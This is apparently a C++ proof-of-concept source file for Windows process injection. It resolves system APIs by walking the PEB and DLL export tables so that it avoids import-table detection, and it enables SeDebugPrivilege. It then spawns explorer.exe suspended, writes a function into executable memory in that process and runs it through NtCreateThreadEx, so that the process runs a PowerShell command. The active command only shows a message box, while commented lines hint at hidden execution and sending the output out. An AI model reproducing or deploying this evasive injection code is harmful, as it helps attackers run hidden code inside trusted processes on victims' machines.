#include "FunctionHook.h"

#pragma comment(linker, "/SUBSYSTEM:console /ENTRY:WinMainCRTStartup")

namespace functions {

	using GetModuleHandlePrototype = HMODULE(WINAPI*)(LPCSTR);
	GetModuleHandlePrototype GetModuleHandleA;

	using GetProcAddressPrototype = FARPROC(WINAPI*)(HMODULE, LPCSTR);
	GetProcAddressPrototype GetProcAddress;

	using LoadLibraryWPrototype = HMODULE(WINAPI*)(LPCWSTR);
	LoadLibraryWPrototype LoadLibraryW;

	using LoadLibraryAPrototype = HMODULE(WINAPI*)(LPCSTR);
	LoadLibraryAPrototype LoadLibraryA;

	using OpenProcessPrototype = HANDLE(WINAPI*)(DWORD, BOOL, DWORD);
	OpenProcessPrototype OpenProcess;

	using CreateProcessWPrototype = BOOL(WINAPI*)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
	CreateProcessWPrototype CreateProcessW;

	using GetConsoleWindowPrototype = HWND(WINAPI*)();
	GetConsoleWindowPrototype GetConsoleWindow;

	using ShowWindowPrototype = BOOL(WINAPI*)(HWND, int);
	ShowWindowPrototype ShowWindow;

	using OpenProcessTokenPrototype = BOOL(WINAPI*)(HANDLE, DWORD, PHANDLE);
	OpenProcessTokenPrototype OpenProcessToken;

	using GetCurrentProcessPrototype = HANDLE(WINAPI*)();
	GetCurrentProcessPrototype GetCurrentProcess;

	using IsWow64ProcessPrototype = BOOL(WINAPI*)(HANDLE, PBOOL);
	IsWow64ProcessPrototype IsWow64Process;

	using LookupPrivilegeValueWPrototype = BOOL(WINAPI*)(LPCWSTR, LPCWSTR, PLUID);
	LookupPrivilegeValueWPrototype LookupPrivilegeValueW;

	using AdjustTokenPrivilegesPrototype = BOOL(WINAPI*)(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
	AdjustTokenPrivilegesPrototype AdjustTokenPrivileges;

	using CloseHandlePrototype = BOOL(WINAPI*)(HANDLE);
	CloseHandlePrototype CloseHandle;

	using lstrcpyWPrototype = LPWSTR(WINAPI*)(LPWSTR, LPCWSTR);
	lstrcpyWPrototype lstrcpyW;

	using GetLastErrorPrototype = DWORD(WINAPI*)();
	GetLastErrorPrototype GetLastError;

	using WriteProcessMemoryPrototype = BOOL(WINAPI*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
	WriteProcessMemoryPrototype WriteProcessMemory;

#ifdef _WIN64

	using RtlAddFunctionTablePrototype = BOOLEAN(WINAPI*)(PRUNTIME_FUNCTION, DWORD, DWORD64); //x64
	RtlAddFunctionTablePrototype RtlAddFunctionTable;

	using RtlLookupFunctionEntryPrototype = PRUNTIME_FUNCTION(WINAPI*)(DWORD64, PDWORD64, PUNWIND_HISTORY_TABLE); //x64
	RtlLookupFunctionEntryPrototype RtlLookupFunctionEntry;

#endif

	using VirtualProtectExPrototype = BOOL(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
	VirtualProtectExPrototype VirtualProtectEx;

	using ReadProcessMemoryPrototype = BOOL(WINAPI*)(HANDLE, LPCVOID, LPCVOID, SIZE_T, SIZE_T*);
	ReadProcessMemoryPrototype ReadProcessMemory;

	using CreateRemoteThreadPrototype = HANDLE(WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
	CreateRemoteThreadPrototype CreateRemoteThread;

	using GetExitCodeProcessPrototype = BOOL(WINAPI*)(HANDLE, LPDWORD);
	GetExitCodeProcessPrototype GetExitCodeProcess;

	using TerminateProcessPrototype = BOOL(WINAPI*)(HANDLE, UINT);
	TerminateProcessPrototype TerminateProcess;

	using GetCurrentProcessIdPrototype = DWORD(WINAPI*)();
	GetCurrentProcessIdPrototype GetCurrentProcessId;

	using GetCurrentThreadIdPrototype = DWORD(WINAPI*)();
	GetCurrentThreadIdPrototype GetCurrentThreadId;

	using VirtualAllocExPrototype = LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
	VirtualAllocExPrototype VirtualAllocEx;

	using VirtualFreeExPrototype = BOOL(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD);
	VirtualFreeExPrototype VirtualFreeEx;

	using MessageBoxWPrototype = BOOL(WINAPI*)(HWND, LPCWSTR, LPCWSTR, UINT);
	MessageBoxWPrototype MessageBoxW;

	// Utility function to convert an UNICODE_STRING to a char*. Defined at the end of the file
	HRESULT UnicodeToAnsi(LPCOLESTR pszW, LPSTR* ppszA);

	// Dynamically finds the base address of a DLL in memory
	ADDR find_dll_base(const char* dll_name)
	{

		// https://stackoverflow.com/questions/37288289/how-to-get-the-process-environment-block-peb-address-using-assembler-x64-os - x64 version
		// Note: the PEB can also be found using NtQueryInformationProcess, but this technique requires a call to GetProcAddress
		//  and GetModuleHandle which defeats the very purpose of this PoC

		PTEB teb = reinterpret_cast<PTEB>(
			readword(
				reinterpret_cast<DWORD_PTR>(
					&static_cast<NT_TIB*>(nullptr)->Self
					)
			)
			);

		PPEB_LDR_DATA loader = teb->ProcessEnvironmentBlock->Ldr;

		PLIST_ENTRY head = &loader->InMemoryOrderModuleList;
		PLIST_ENTRY curr = head->Flink;

		// Iterate through every loaded DLL in the current process
		do {
			PLDR_DATA_TABLE_ENTRY dllEntry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
			char* dllName;
			// Convert unicode buffer into char buffer for the time of the comparison, then free it
			UnicodeToAnsi(dllEntry->FullDllName.Buffer, &dllName);

			printf("%s\n", dllName);

			char* temp = _strdup(dllName);
			unsigned char* tptr = (unsigned char*)temp;
			while (*tptr) {
				*tptr = tolower(*tptr);
				tptr++;
			}

			//char* result = strstr(dllName, dll_name);
			char* result = strstr(temp, dll_name);
			CoTaskMemFree(dllName); // Free buffer allocated by UnicodeToAnsi
			free(temp);

			if (result != NULL) {
				// Found the DLL entry in the PEB, return its base address
				return (ADDR)dllEntry->DllBase;
			}
			curr = curr->Flink;
		} while (curr != head);

		return NULL;
	}

	// Utility function to convert an UNICODE_STRING to a char*
	HRESULT UnicodeToAnsi(LPCOLESTR pszW, LPSTR* ppszA)
	{
		ULONG cbAnsi, cCharacters;
		DWORD dwError;
		// If input is null then just return the same.
		if (pszW == NULL) {
			*ppszA = NULL;
			return NOERROR;
		}
		cCharacters = wcslen(pszW) + 1;
		cbAnsi = cCharacters * 2;

		*ppszA = (LPSTR)CoTaskMemAlloc(cbAnsi);
		if (NULL == *ppszA)
			return E_OUTOFMEMORY;

		if (0 == WideCharToMultiByte(CP_ACP, 0, pszW, cCharacters, *ppszA, cbAnsi, NULL, NULL)) {
			dwError = GetLastError();
			CoTaskMemFree(*ppszA);
			*ppszA = NULL;
			return HRESULT_FROM_WIN32(dwError);
		}
		return NOERROR;
	}

	// Given the base address of a DLL in memory, returns the address of an exported function
	ADDR find_dll_export(ADDR dll_base, const char* export_name)
	{
		// Read the DLL PE header and NT header
		PIMAGE_DOS_HEADER peHeader = (PIMAGE_DOS_HEADER)dll_base;
		PIMAGE_NT_HEADERS peNtHeaders = (PIMAGE_NT_HEADERS)(dll_base + peHeader->e_lfanew);
		// The RVA of the export table if indicated in the PE optional header
		// Read it, and read the export table by adding the RVA to the DLL base address in memory
		DWORD exportDescriptorOffset = peNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
		PIMAGE_EXPORT_DIRECTORY exportTable = (PIMAGE_EXPORT_DIRECTORY)(dll_base + exportDescriptorOffset);
		// Browse every export of the DLL. For the i-th export:
		// - The i-th element of the name table contains the export name
		// - The i-th element of the ordinal table contains the index with which the functions table must be indexed to get the final function address
		DWORD* name_table = (DWORD*)(dll_base + exportTable->AddressOfNames);
		WORD* ordinal_table = (WORD*)(dll_base + exportTable->AddressOfNameOrdinals);
		DWORD* func_table = (DWORD*)(dll_base + exportTable->AddressOfFunctions);
		for (int i = 0; i < exportTable->NumberOfNames; ++i) {
			char* funcName = (char*)(dll_base + name_table[i]);
			ADDR func_ptr = dll_base + func_table[ordinal_table[i]];
			if (!_strcmpi(funcName, export_name)) {
				return func_ptr;
			}
		}
		return NULL;
	}

	void resolve_imports() {

		/*
		//ADDR kernel32_base = find_dll_base("KERNEL32.DLL");
		ADDR advapi32_base = find_dll_base("advapi32.dll");
		ADDR user32_base = find_dll_base("USER32.dll");
		*/

		ADDR kernel32_base = find_dll_base("kernel32.dll");

		if (DEBUG) {
			printf("KERNEL32.dll = %p\n", kernel32_base);
		}

		GetProcAddress = (GetProcAddressPrototype)find_dll_export(kernel32_base, "GetProcAddress");
		GetModuleHandleA = (GetModuleHandlePrototype)find_dll_export(kernel32_base, "GetModuleHandleA");

		if (DEBUG) {
			printf("module kernel32.dll = %p\n", GetModuleHandleA("kernel32.dll"));
			printf("module advapi32.dll = %p\n", GetModuleHandleA("advapi32.dll"));
			printf("module user32.dll = %p\n", GetModuleHandleA("user32.dll"));
		}

#define kernel32_import(_name, _type) (_type) GetProcAddress(GetModuleHandleA("kernel32.dll"), _name)
#define advapi32_import(_name, _type) (_type) GetProcAddress(GetModuleHandleA("advapi32.dll"), _name)
#define user32_import(_name, _type) (_type) GetProcAddress(GetModuleHandleA("user32.dll"), _name)

		functions::LoadLibraryW = kernel32_import("LoadLibraryW", LoadLibraryWPrototype);
		functions::LoadLibraryA = kernel32_import("LoadLibraryA", LoadLibraryAPrototype);

		//use manual mapping (maybe not required to be clean)
		functions::LoadLibraryW(L"advapi32.dll");
		functions::LoadLibraryW(L"user32.dll");

		ADDR advapi32_base = find_dll_base("advapi32.dll");
		ADDR user32_base = find_dll_base("user32.dll");

		if (DEBUG) {
			printf("ADVAPI32.dll = %p\n", advapi32_base);
			printf("USER32.dll = %p\n", user32_base);
		}

		functions::OpenProcess = kernel32_import("OpenProcess", OpenProcessPrototype);
		functions::CreateProcessW = kernel32_import("CreateProcessW", CreateProcessWPrototype);
		functions::GetConsoleWindow = kernel32_import("GetConsoleWindow", GetConsoleWindowPrototype);
		functions::CloseHandle = kernel32_import("CloseHandle", CloseHandlePrototype);
		functions::lstrcpyW = kernel32_import("lstrcpyW", lstrcpyWPrototype);
		functions::GetLastError = kernel32_import("GetLastError", GetLastErrorPrototype);
		functions::GetCurrentProcess = kernel32_import("GetCurrentProcess", GetCurrentProcessPrototype);
		functions::IsWow64Process = kernel32_import("IsWow64Process", IsWow64ProcessPrototype);
		functions::WriteProcessMemory = kernel32_import("WriteProcessMemory", WriteProcessMemoryPrototype);
		functions::VirtualProtectEx = kernel32_import("VirtualProtectEx", VirtualProtectExPrototype);
		functions::ReadProcessMemory = kernel32_import("ReadProcessMemory", ReadProcessMemoryPrototype);
		functions::CreateRemoteThread = kernel32_import("CreateRemoteThread", CreateRemoteThreadPrototype);
		functions::GetExitCodeProcess = kernel32_import("GetExitCodeProcess", GetExitCodeProcessPrototype);
		functions::TerminateProcess = kernel32_import("TerminateProcess", TerminateProcessPrototype);
		functions::GetCurrentProcessId = kernel32_import("GetCurrentProcessId", GetCurrentProcessIdPrototype);
		functions::GetCurrentThreadId = kernel32_import("GetCurrentThreadId", GetCurrentThreadIdPrototype);
		functions::VirtualAllocEx = kernel32_import("VirtualAllocEx", VirtualAllocExPrototype);
		functions::VirtualFreeEx = kernel32_import("VirtualFreeEx", VirtualFreeExPrototype);

#ifdef _WIN64
		functions::RtlAddFunctionTable = kernel32_import("RtlAddFunctionTable", RtlAddFunctionTablePrototype);
		functions::RtlLookupFunctionEntry = kernel32_import("RtlLookupFunctionEntry", RtlLookupFunctionEntryPrototype);
#endif

		functions::OpenProcessToken = advapi32_import("OpenProcessToken", OpenProcessTokenPrototype); //advapi32.dll
		functions::AdjustTokenPrivileges = advapi32_import("AdjustTokenPrivileges", AdjustTokenPrivilegesPrototype); //advapi32.dll
		functions::LookupPrivilegeValueW = advapi32_import("LookupPrivilegeValueW", LookupPrivilegeValueWPrototype); //advapi32.dll

		functions::ShowWindow = user32_import("ShowWindow", ShowWindowPrototype); //user32.dll
		functions::MessageBoxW = user32_import("MessageBoxW", MessageBoxWPrototype); //user32.dll

	}

};

bool IsCorrectTargetArchitecture(HANDLE hProc);

HANDLE openProcess(DWORD pid) {
	HANDLE hProc = functions::OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (IsCorrectTargetArchitecture(hProc)) {
		return hProc;
	}

	std::string message = std::system_category().message(GetLastError());
	printf("%s", message);

	return NULL;
}


bool IsCorrectTargetArchitecture(HANDLE hProc) {
	BOOL bTarget = FALSE;
	if (!functions::IsWow64Process(hProc, &bTarget)) {
		if (DEBUG)
			printf("Can't confirm target process architecture: 0x%X\n", GetLastError());
		return false;
	}

	BOOL bHost = FALSE;
	functions::IsWow64Process(functions::GetCurrentProcess(), &bHost);

	return (bTarget == bHost);
}

typedef NTSTATUS(NTAPI* pNtCreateThreadEx) (
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer
	);

using warp_GetProcAddress = FARPROC(WINAPI*)(HMODULE hModule, LPCSTR lpProcName);
using warp_LoadLibraryA = HINSTANCE(WINAPI*)(const char* lpLibFilename);
using warp_FreeLibrary = BOOL(WINAPI*)(HMODULE hLibModule);

using warp_MessageBoxA = BOOL(WINAPI*)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);

using warp__popen = FILE*(__cdecl*)(const char* _Command, const char* _Mode);
using warp__pclose = int(__cdecl*)(FILE* _Stream);
using warp_fgets = char* (__cdecl*)(char*, int _MaxCount, FILE* _Stream);
using warp_feof = int (__cdecl*)(FILE* _Stream);

struct mapping_data {
	warp_GetProcAddress GetProcAddress_warpper;
	warp_LoadLibraryA LoadLibraryA_warpper;
	warp_FreeLibrary FreeLibrary_warpper;

	warp_MessageBoxA MessageBoxW_warpper;

	//warp_fgets test;

	LPVOID command;
	LPVOID mode;

	LPVOID _popenChars;
	LPVOID _pcloseChars;
	LPVOID fgetsChars;
	LPVOID feofChars;

	LPVOID LibChars;
};

#pragma runtime_checks( "", off )
#pragma optimize( "", off )
void Shellcode(mapping_data* data) {

	//data->MessageBoxW_warpper(NULL, NULL, NULL, MB_OK);

	HMODULE StdioCrtModule = data->LoadLibraryA_warpper((LPCSTR)data->LibChars);
	if (StdioCrtModule == NULL) {
		data->MessageBoxW_warpper(NULL, NULL, NULL, MB_OK);
		return;
	}

	warp__popen l_popen = (warp__popen)data->GetProcAddress_warpper(StdioCrtModule, (LPCSTR)(data->_popenChars));
	if (l_popen == NULL) {
		return;
	}

	warp__pclose l_pclose = (warp__pclose)data->GetProcAddress_warpper(StdioCrtModule, (LPCSTR)(data->_pcloseChars));
	if (l_pclose == NULL) {
		return;
	}

	warp_fgets lfgets = (warp_fgets)data->GetProcAddress_warpper(StdioCrtModule, (LPCSTR)(data->fgetsChars));
	if (lfgets == NULL) {
		return;
	}

	warp_feof lfeof = (warp_feof)data->GetProcAddress_warpper(StdioCrtModule, (LPCSTR)(data->feofChars));
	if (lfeof == NULL) {
		return;
	}

	char   psBuffer[128];
	FILE* pPipe;

	if ((pPipe = l_popen((LPCSTR)data->command, (LPCSTR)data->mode)) == NULL)
		return;

	/* Read pipe until end of file, or an error occurs. */
	//while (lfgets(psBuffer, 128, pPipe)) {
	////	//send-buffer(psBuffer);
		//data->MessageBoxW_warpper(NULL, psBuffer, NULL, MB_OK);
	//}

	/* Close pipe and print return value of pPipe. */
	//if (lfeof(pPipe)) {
		//l_pclose(pPipe);
	//} else {
		//error
	//}

	data->FreeLibrary_warpper(StdioCrtModule);
	//data->MessageBoxW_warpper(NULL, (LPCSTR)data->LibChars, (LPCSTR)data->_popenChars, MB_OK);
}

LPVOID RemoteAllocateMem_str(HANDLE hProc, const char* s) {
	LPVOID allocatedMem = VirtualAllocEx(hProc, NULL, strlen(s), MEM_COMMIT, PAGE_READWRITE);
	if (allocatedMem) {
		WriteProcessMemory(hProc, allocatedMem, s, strlen(s), NULL);
		return allocatedMem;
	}
	return NULL;
}

void showProcessInformation() {
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot) {
		PROCESSENTRY32 pe32;
		pe32.dwSize = sizeof(PROCESSENTRY32);
		if (Process32First(hSnapshot, &pe32)) {
			do {

				char* MB = (char*)malloc(wcslen(pe32.szExeFile) + 1);
				wcstombs(MB, pe32.szExeFile, wcslen(pe32.szExeFile) + 1);

				printf("pid %d %s\n", pe32.th32ProcessID, MB);
			} while (Process32Next(hSnapshot, &pe32));
		}
		CloseHandle(hSnapshot);
	}
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
{

	//showProcessInformation();

	//return 0;

	functions::resolve_imports();

	/*if (!DEBUG) {
		HWND hwnd = functions::GetConsoleWindow();
		functions::ShowWindow(hwnd, 0);
	}*/

	TOKEN_PRIVILEGES priv;
	ZeroMemory(&priv, sizeof(priv));

	HANDLE hToken = NULL;
	if (functions::OpenProcessToken(functions::GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		priv.PrivilegeCount = 1;
		priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;


		if (functions::LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
			functions::AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL);
		functions::CloseHandle(hToken);
	}

	STARTUPINFO si = { 0 };
	ZeroMemory(&si, sizeof(si));

	si.cb = sizeof(STARTUPINFO);
	si.wShowWindow = SW_NORMAL;

	PROCESS_INFORMATION pi;


	LPWSTR pFilename = (LPWSTR)calloc(13, sizeof(wchar_t));
	wcscpy_s(pFilename, 13, L"explorer.exe");

	wprintf(pFilename);

	std::cout << std::endl;

	BOOL result = functions::CreateProcessW(NULL, pFilename, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

	std::cout << result << std::endl;

	if (!result) {
		if (DEBUG)
			printf("\nError: Error creating process.\n");
		return -1;
	}

	if (DEBUG)
		printf("Process pid: %d\n", pi.dwProcessId);

	HANDLE hProc = functions::OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId); //openProcess(pi.dwProcessId); //GETPROO()

	if (!hProc) {
		DWORD Err = functions::GetLastError();
		if (DEBUG)
			printf("OpenProcess failed: 0x%X\n", Err);
		return -2;
	}

	if (!IsCorrectTargetArchitecture(hProc)) {
		if (DEBUG)
			printf("Invalid Process Architecture.\n");
		functions::CloseHandle(pi.hProcess);
		functions::CloseHandle(pi.hThread);
		functions::CloseHandle(hProc);
		return -3;
	}


	mapping_data data = { 0 };
	const size_t mapping_data_SIZE = sizeof(mapping_data);

	data.GetProcAddress_warpper = (warp_GetProcAddress)GetProcAddress;
	data.LoadLibraryA_warpper = (warp_LoadLibraryA)LoadLibraryA;
	data.FreeLibrary_warpper = (warp_FreeLibrary)FreeLibrary;

	data.MessageBoxW_warpper = (warp_MessageBoxA)MessageBoxA;

	data.LibChars = RemoteAllocateMem_str(hProc, "api-ms-win-crt-stdio-l1-1-0.dll");

	data._popenChars = RemoteAllocateMem_str(hProc, "_popen");
	data._pcloseChars = RemoteAllocateMem_str(hProc, "_pclose");
	data.fgetsChars = RemoteAllocateMem_str(hProc, "fgets");
	data.feofChars = RemoteAllocateMem_str(hProc, "feof");

	//data.command = RemoteAllocateMem_str(hProc, "PowerShell -NoProfile -WindowStyle Hidden -Command echo 'Hello, World! MotherFuckers'");
	data.command = RemoteAllocateMem_str(hProc, "PowerShell -Command \"Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Hello World')\"");
	
	data.mode = RemoteAllocateMem_str(hProc, "rt");

	//allocate page (space) for data (mapping_data) and get its address to MappingDataAlloc
	LPVOID MappingDataAlloc = VirtualAllocEx(hProc, nullptr, mapping_data_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!MappingDataAlloc) {
		perror("VirtualAllocEx MappingDataAlloc error");
		return 0;
	}
	//writing data (mapping_data) to MappingDataAlloc
	if (!WriteProcessMemory(hProc, MappingDataAlloc, &data, mapping_data_SIZE, nullptr)) {
		perror("WriteProcessMemory MappingDataAlloc error");
	}

	//allocate page (space 1 << 12) for shellcode function and get its address to pShellcode
	LPVOID pShellcode = VirtualAllocEx(hProc, nullptr, 1 << 12, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!pShellcode) {
		perror("VirtualAllocEx pShellcode error");
		return 0;
	}
	//writing shellcode function to pShellcode
	if (!WriteProcessMemory(hProc, pShellcode, Shellcode, 1 << 12, nullptr)) {
		perror("WriteProcessMemory pShellcode error");
		return 0;
	}

	//execute your function

	HMODULE hKernel32 = GetModuleHandleA("Kernel32");
	if (!hKernel32)
		return 1;

	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (!hNtdll)
		return 1;

	pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

	DWORD pid = pi.dwProcessId;
	HANDLE ht; // thread handle
	LPVOID rb; // remote buffer
	SIZE_T rl; // return length

	NtCreateThreadEx(&ht, 0x1FFFFF, NULL, hProc, (LPTHREAD_START_ROUTINE)pShellcode, MappingDataAlloc, FALSE, NULL, NULL, NULL, NULL);
	if (ht) {
		WaitForSingleObject(ht, INFINITE);
		CloseHandle(ht);
	}

	/*HANDLE shellcodeThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pShellcode, MappingDataAlloc, 0, NULL);
	if (shellcodeThread) {
		WaitForSingleObject(shellcodeThread, INFINITE);
		CloseHandle(shellcodeThread);
	}*/
	
	//cleanup process
	//free data members...
	
	//cleanup overall process, handlers, threads
	TerminateProcess(hProc, 0);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	CloseHandle(hProc);

	if (DEBUG)
		printf("OK\n");

	return EXIT_SUCCESS;
}